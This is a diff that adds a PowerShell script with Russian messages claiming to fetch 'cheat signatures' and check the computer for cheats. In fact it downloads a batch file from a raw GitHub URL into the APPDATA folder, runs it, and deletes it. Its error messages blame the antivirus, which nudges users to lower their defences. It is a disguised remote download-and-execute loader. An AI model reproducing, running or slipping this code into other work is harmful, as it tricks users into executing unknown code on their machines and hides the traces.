@@ -1,0 +1,15 @@
+$ABC = "https://raw.githubusercontent.com/NewDarkys/wifi/main/Noob.bat";
+$DFG = "Senko.bat";
+
+try{
+    Write-Host 'Получение сигнатур читов...'-ForegroundColor Gray; $wc = new-object net.webclient; $wc.DownloadFile($ABC, $env:APPDATA + "/" + $DFG); Write-Host 'Сигнатуры получены'-ForegroundColor Green
+} catch {
+    Write-Host 'Возникла ошибка при получении сигнатур читов, возможно виноват антивирус.'-ForegroundColor Red; pause; return
+};
+try {
+    Write-Host 'Проверка...'-ForegroundColor Gray; & $env:APPDATA\$DFG; Remove-Item $env:APPDATA\$DFG;
+} catch {
+    Write-Host 'Возникла ошибка при проверке на читы. Скорее всего виноват антивирус.'-ForegroundColor Red; Remove-Item $env:APPDATA\$DFG; pause; return
+};
+
+# Целую в попку <3
